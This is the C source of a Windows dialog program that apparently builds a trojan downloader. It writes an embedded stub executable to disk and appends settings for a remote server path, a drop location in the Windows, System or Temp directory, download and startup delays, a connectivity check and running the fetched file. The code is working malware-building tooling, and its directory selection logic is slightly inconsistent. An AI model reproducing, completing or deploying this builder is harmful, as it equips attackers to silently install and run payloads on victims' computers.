#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <commctrl.h>
#include <io.h>
#include <fcntl.h>
#include <shlwapi.h>
#include <stddef.h>
#include <limits.h>
#include "resource.h"

// g (Global optimization), s (Favor small code), y (No frame pointers).
#pragma optimize("gsy", on)
#pragma comment(linker, "/FILEALIGN:0x200")
#pragma comment(linker, "/MERGE:.rdata=.data")
#pragma comment(linker, "/MERGE:.text=.data")
#pragma comment(linker, "/MERGE:.reloc=.data")
#pragma comment(linker, "/SECTION:.text, EWR /IGNORE:4078")
#pragma comment(linker, "/OPT:NOWIN98")		// Make section alignment really small.
#define WIN32_LEAN_AND_MEAN

#pragma comment(lib, "COMCTL32")

HINSTANCE	hInst;
HWND		hDlg;
HANDLE		hLoader;
long		iDD, iSUD, iCC;

struct file_data{
	char			szServerPath[512];
	char			szLocalFileName[512];
	char			szCustomDir[512];
	short			iDir;
	short			iDownloadDelay;
	DWORD			dwDTime;
	short			iStartUpDelay;
	DWORD			dwSUTime;
	short			iCheckConnection;
	short			iRun;
	short			iRunStyle;
} *pfile_data;

#define BUF_SIZE 512

BOOL		CALLBACK Main(HWND hDlg,UINT uMsg,WPARAM wParam,LPARAM lParam);
int			CALLBACK About(HWND hDlg, UINT message, WPARAM wparam, LPARAM lparam);
BOOL		ExtractLoader(char *);
BOOL		WriteSettings(void);
void		MakeFlatCombo(HWND hCombo);
void		FillComboBox(HWND hCombo);

int WINAPI WinMain(HINSTANCE hinstCurrent,HINSTANCE hinstPrevious,LPSTR lpszCmdLine,int nCmdShow){
	hInst= hinstCurrent;
	DialogBox(hinstCurrent, MAKEINTRESOURCE(IDD_MAIN), NULL, (DLGPROC)Main);
	return 0;
}

BOOL CALLBACK Main(HWND hDlgMain,UINT uMsg,WPARAM wParam,LPARAM lParam){
	HDC				hdc;
	PAINTSTRUCT		ps;
	OPENFILENAME	ofn;
	int				iSelect;
	char			szBound[_MAX_FNAME]= "WD";

	hDlg= hDlgMain;

	switch( uMsg ){
		case WM_INITDIALOG:
			SendMessageA(hDlg,WM_SETICON,ICON_SMALL, (LPARAM) LoadIcon(hInst,MAKEINTRESOURCE(IDI_ICON)));
			SendMessageA(hDlg,WM_SETICON, ICON_BIG,(LPARAM) LoadIcon(hInst,MAKEINTRESOURCE(IDI_ICON)));
			MakeFlatCombo(GetDlgItem(hDlg, IDC_DIR));
			FillComboBox(GetDlgItem(hDlg, IDC_DIR));
		break;
		case WM_COMMAND:
			if( LOWORD(wParam)==IDC_BUILD ){
				if( HIWORD(wParam)==BN_CLICKED ){
					ZeroMemory(&ofn, sizeof(OPENFILENAME));
					ofn.lStructSize= sizeof(OPENFILENAME);
					ofn.hwndOwner= hDlg;
					ofn.lpstrFilter= "Application (*.exe)\0*.exe\0";
					ofn.lpstrFile= szBound;
					ofn.lpstrDefExt= "exe";
					ofn.nMaxFile= MAX_PATH;
					ofn.Flags= OFN_EXPLORER | OFN_HIDEREADONLY | OFN_OVERWRITEPROMPT;

					if( GetSaveFileName(&ofn) ){
						if(!ExtractLoader(szBound)){
							return FALSE;
						}
						if( !WriteSettings() ){
							MessageBox(hDlg, "Error writing Settings.", NULL, MB_OK);
							CloseHandle(hLoader);
							return FALSE;
						}
					}
				}
			}else if( LOWORD(wParam)==IDC_ABOUT ){
				if( HIWORD(wParam)==BN_CLICKED ){
					DialogBoxParamA(GetModuleHandleA(0), MAKEINTRESOURCE(IDD_ABOUT), hDlg, About, 0);
				}
			}else if( LOWORD(wParam)==IDC_EXIT ){
				if( HIWORD(wParam)==BN_CLICKED ){
					EndDialog(hDlg,wParam);
				}
			}else if( LOWORD(wParam)==IDC_DOWNLOADDELAY ){
				if( SendDlgItemMessage(hDlg, IDC_DOWNLOADDELAY, BM_GETCHECK, (WPARAM)0, (LPARAM)0)==BST_CHECKED ){
					EnableWindow(GetDlgItem(hDlg, IDC_DOWNLOADTIME), TRUE);
				}else{
					EnableWindow(GetDlgItem(hDlg, IDC_DOWNLOADTIME), FALSE);
				}
			}else if( LOWORD(wParam)==IDC_STARTUPDELAY ){
				if( SendDlgItemMessage(hDlg, IDC_STARTUPDELAY, BM_GETCHECK, (WPARAM)0, (LPARAM)0)==BST_CHECKED ){
					EnableWindow(GetDlgItem(hDlg,IDC_DELAYTIME), TRUE);
				}else{
					EnableWindow(GetDlgItem(hDlg,IDC_DELAYTIME), FALSE);
				}
			}else if( LOWORD(wParam)==IDC_DIR ){
				iSelect= SendMessage(GetDlgItem(hDlg, IDC_DIR), CB_GETCURSEL, 0, 0);
				switch( iSelect ){
					case 0:
						EnableWindow(GetDlgItem(hDlg,IDC_CUSTOM), TRUE);
					break;
					case 1:
					case 2:
					case 3:
						EnableWindow(GetDlgItem(hDlg,IDC_CUSTOM), FALSE);
					break;
				}
			}else if( LOWORD(wParam)==IDC_EXE1 ){
				SendMessage(GetDlgItem(hDlg, IDC_EXE2), BM_SETCHECK, 0,0);
			}else if( LOWORD(wParam)==IDC_EXE2 ){
				SendMessage(GetDlgItem(hDlg, IDC_EXE1), BM_SETCHECK, 0,0);
			}else if( LOWORD(wParam)==IDC_EXECUTE ){
				if( SendDlgItemMessage(hDlg, IDC_EXECUTE, BM_GETCHECK, (WPARAM)0, (LPARAM)0)==BST_CHECKED ){
					EnableWindow(GetDlgItem(hDlg,IDC_EXE1), TRUE);
					EnableWindow(GetDlgItem(hDlg,IDC_EXE2), TRUE);
				}else{
					EnableWindow(GetDlgItem(hDlg,IDC_EXE1), FALSE);
					EnableWindow(GetDlgItem(hDlg,IDC_EXE2), TRUE);
				}
			}
		break;
		case WM_PAINT:
			hdc= BeginPaint(hDlg, &ps);
			InvalidateRect(hDlg, NULL, TRUE);
			EndPaint (hDlg, &ps);
		break;
		case WM_CLOSE:
			EndDialog(hDlg,wParam);
			DestroyWindow(hDlg);
		break;
		case WM_DESTROY:
			PostQuitMessage(0);
		break;
	}
	return FALSE;
}

BOOL ExtractLoader( char *szLoc ){
	HRSRC			rc;
	HGLOBAL			hGlobal;
	HMODULE			hThisProc;
	DWORD			dwSize, dwBytesWritten;
	unsigned char	*lpszData;

	hThisProc= GetModuleHandle(NULL);
	rc= FindResource(hThisProc, MAKEINTRESOURCE(IDR_RT_EXE), "RT_EXE");

	if(hGlobal = LoadResource(hThisProc, rc)) {
		lpszData= (unsigned char *)LockResource(hGlobal);
		dwSize= SizeofResource(hThisProc, rc);
		hLoader= CreateFile(szLoc, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

		if( hLoader==INVALID_HANDLE_VALUE ){
			return FALSE;
		}else{
			WriteFile(hLoader, lpszData, dwSize, &dwBytesWritten, NULL);
		}
	}
	if( dwBytesWritten!=dwSize ){
		MessageBox(NULL, "Error writing stub file.", NULL, MB_ICONERROR | MB_OK);
		return FALSE;
	}else{
		return TRUE;
	}
}

BOOL WriteSettings( void ){
	int					iCurSel, iDownTime, iStartTime;
	struct file_data	fd;
	DWORD				dwStart, dwBytesWritten;
	char				szFN[512], szSP[512], szCD[512], done[40];

	pfile_data= &fd;
	dwStart= GetTickCount();

	srand(dwStart);

	ZeroMemory(&fd, sizeof fd);

	// Retrieve all Settings information.
	// Path to Server.
	GetWindowTextA(GetDlgItem(hDlg, IDC_SERVERPATH), szSP, 512);
	strcpy(pfile_data->szServerPath, szSP);
	// New Filename
	GetWindowTextA(GetDlgItem(hDlg, IDC_FILENAME), szFN, 512);
	strcpy(pfile_data->szLocalFileName, szFN);
	// Path to download to.
	iCurSel= SendMessage(GetDlgItem(hDlg, IDC_DIR), CB_GETCURSEL, 0, 0);
	switch( iCurSel ){
		case 0:
			pfile_data->iDir= 0;
			GetWindowTextA(GetDlgItem(hDlg, IDC_CUSTOM), szCD, 512);
			strcpy(pfile_data->szCustomDir, szCD);
		break;
		case 1:
			pfile_data->iDir= 1;
			GetWindowTextA(GetDlgItem(hDlg, IDC_CUSTOM), szCD, 512);
			//strcpy(pfile_data->szCustomDir, szCD);
		break;
		case 2:
			pfile_data->iDir= 2;
			GetWindowTextA(GetDlgItem(hDlg, IDC_CUSTOM), szCD, 512);
			//strcpy(pfile_data->szCustomDir, szCD);
		break;
		case 3:
			pfile_data->iDir= 3;
			GetWindowTextA(GetDlgItem(hDlg, IDC_CUSTOM), szCD, 512);
			//strcpy(pfile_data->szCustomDir, szCD);
		break;
	}
	iDD= SendDlgItemMessage(hDlg, IDC_DOWNLOADDELAY, BM_GETCHECK, (WPARAM)0, (LPARAM)0);
	iSUD= SendDlgItemMessage(hDlg, IDC_STARTUPDELAY, BM_GETCHECK, (WPARAM)0, (LPARAM)0);
	iCC= SendDlgItemMessage(hDlg, IDC_CHECKINTERNET, BM_GETCHECK, (WPARAM)0, (LPARAM)0);
	if( iDD==BST_CHECKED ){
		iDownTime= GetDlgItemInt(hDlg, IDC_DOWNLOADTIME, NULL, FALSE);
		pfile_data->iDownloadDelay= 1;
		pfile_data->dwDTime= iDownTime;
	}else{
		pfile_data->iDownloadDelay= 0;
		pfile_data->dwDTime= 0;
	}
	if( iSUD==BST_CHECKED ){
		iStartTime= GetDlgItemInt(hDlg, IDC_DELAYTIME, NULL, FALSE);
		pfile_data->iStartUpDelay= 1;
		pfile_data->dwSUTime= iStartTime;
	}else{
		pfile_data->iStartUpDelay= 0;
		pfile_data->dwSUTime= 0;
	}
	if( iCC==BST_CHECKED ){
		pfile_data->iCheckConnection= 1;
	}else{
		pfile_data->iCheckConnection= 0;
	}
	iCurSel= SendDlgItemMessage(hDlg, IDC_EXECUTE, BM_GETCHECK, (WPARAM)0, (LPARAM)0);
	if( iCurSel==BST_CHECKED ){
		pfile_data->iRun= 1;
		iCurSel= (int) SendMessage(GetDlgItem(hDlg, IDC_EXE1), BM_GETCHECK, 0, 0);
		if( iCurSel ){
			pfile_data->iRunStyle= 1;
		}else{
			pfile_data->iRunStyle= 0;
		}
	}else{
		pfile_data->iRun= 0;
	}
	SetFilePointer(hLoader, 0, NULL, FILE_END);
	WriteFile(hLoader, pfile_data, sizeof fd, &dwBytesWritten, NULL);
	wsprintf(done, "Done in %d second(s).", (GetTickCount() - dwStart) / 1000);
	MessageBox(NULL, done, "Finished.", MB_OK);
	CloseHandle(hLoader);
	return TRUE;
}

int CALLBACK About(HWND hDlgAbout, UINT message, WPARAM wParam, LPARAM lParam){
	switch( message ){
		case WM_INITDIALOG:
			break;
		case WM_CLOSE:
			EndDialog(hDlgAbout, wParam);
			break;
		case WM_COMMAND:
			EndDialog(hDlgAbout, wParam);
		default:
			return 0;
	}
	return 0;
}

LRESULT WINAPI FlatComboProc( HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam ){
	HDC				hdc;
	PAINTSTRUCT		ps;
	RECT			rect;
	RECT			rect2;
	POINT			pt;
	
	WNDPROC			OldComboProc = (WNDPROC)GetWindowLong(hwnd, GWL_USERDATA);

	static BOOL		fMouseDown   = FALSE;
	static BOOL		fButtonDown  = FALSE;
	
	switch( msg ){
		case WM_PAINT:
			if( wParam==0 ){
				hdc= BeginPaint(hwnd, &ps);
			}else{
				hdc= (HDC)wParam;
			}
			//	Mask off the borders and draw ComboBox normally.
			GetClientRect(hwnd, &rect);
			InflateRect(&rect, -GetSystemMetrics(SM_CXEDGE), -GetSystemMetrics(SM_CYEDGE));

			rect.right -= GetSystemMetrics(SM_CXVSCROLL);

			IntersectClipRect(hdc, rect.left, rect.top, rect.right, rect.bottom);
			
			// Draw the ComboBox
			CallWindowProc(OldComboProc, hwnd, msg, (WPARAM)hdc, lParam);

			//	Now mask off inside and draw the borders
			SelectClipRgn(hdc, NULL);
			rect.right += GetSystemMetrics(SM_CXVSCROLL);

			ExcludeClipRect(hdc, rect.left, rect.top, rect.right, rect.bottom);
			
			// draw borders
			GetClientRect(hwnd, &rect2);
			FillRect(hdc, &rect2, GetSysColorBrush(COLOR_3DSHADOW));

			// now draw the button
			SelectClipRgn(hdc, NULL);
			rect.left = rect.right - GetSystemMetrics(SM_CXVSCROLL);
			
			if( fButtonDown ){
				DrawFrameControl(hdc, &rect, DFC_SCROLL, DFCS_SCROLLCOMBOBOX|DFCS_FLAT|DFCS_PUSHED);
			//FillRect(hdc, &rect, GetSysColorBrush(COLOR_3DDKSHADOW));
			}else{
				DrawFrameControl(hdc, &rect, DFC_SCROLL, DFCS_SCROLLCOMBOBOX|DFCS_FLAT);
				//FillRect(hdc, &rect, GetSysColorBrush(COLOR_3DFACE));
			}
			if( wParam==0 ){
				EndPaint(hwnd, &ps);
			}
			return 0;
			
			// check if mouse is within drop-arrow area, toggle
			// a flag to say if the mouse is up/down. Then invalidate
			// the window so it redraws to show the changes.
		case WM_LBUTTONDBLCLK:
		case WM_LBUTTONDOWN:
			pt.x = (short)LOWORD(lParam);
			pt.y = (short)HIWORD(lParam);

			GetClientRect(hwnd, &rect);

			InflateRect(&rect, -GetSystemMetrics(SM_CXEDGE), -GetSystemMetrics(SM_CYEDGE));
			rect.left = rect.right - GetSystemMetrics(SM_CXVSCROLL);

			if( PtInRect(&rect, pt) ){
				// we *should* call SetCapture, but the ComboBox does it for us
				// SetCapture
				fMouseDown = TRUE;
				fButtonDown = TRUE;
				InvalidateRect(hwnd, 0, 0);
			}
			break;
			// mouse has moved. Check to see if it is in/out of the drop-arrow
		case WM_MOUSEMOVE:
			pt.x = (short)LOWORD(lParam);
			pt.y = (short)HIWORD(lParam);

			if( fMouseDown&&( wParam&MK_LBUTTON ) ){
				GetClientRect(hwnd, &rect);
				InflateRect(&rect, -GetSystemMetrics(SM_CXEDGE), -GetSystemMetrics(SM_CYEDGE));
				rect.left = rect.right - GetSystemMetrics(SM_CXVSCROLL);

				if( fButtonDown!=PtInRect(&rect, pt) ){
					fButtonDown = PtInRect(&rect, pt);
					InvalidateRect(hwnd, 0, 0);
				}
			}
			break;
		case WM_LBUTTONUP:
			if( fMouseDown ){
				// No need to call ReleaseCapture, the ComboBox does it for us
				// ReleaseCapture
				fMouseDown = FALSE;
				fButtonDown = FALSE;
				InvalidateRect(hwnd, 0, 0);
			}
			break;
	}
	return CallWindowProc(OldComboProc, hwnd, msg, wParam, lParam);
}

void MakeFlatCombo( HWND hwndCombo ){
	LONG OldComboProc;

	// Remember old window procedure
	OldComboProc= GetWindowLong(hwndCombo, GWL_WNDPROC);
	SetWindowLong(hwndCombo, GWL_USERDATA, OldComboProc);

	// Perform the subclass
	OldComboProc= SetWindowLong(hwndCombo, GWL_WNDPROC, (LONG)FlatComboProc);
}

void FillComboBox( HWND hCombo ){
	SendMessage(hCombo, CB_ADDSTRING, 0, (LPARAM)(LPCTSTR)"< Windows Directory >");
	SendMessage(hCombo, CB_ADDSTRING, 0, (LPARAM)(LPCTSTR)"< System Directory >");
	SendMessage(hCombo, CB_ADDSTRING, 0, (LPARAM)(LPCTSTR)"< Temp Directory >");
	SendMessage(hCombo, CB_ADDSTRING, 0, (LPARAM)(LPCTSTR)"< ...Custom... >");
	SendMessage(hCombo, CB_SETCURSEL, 0, 0);
}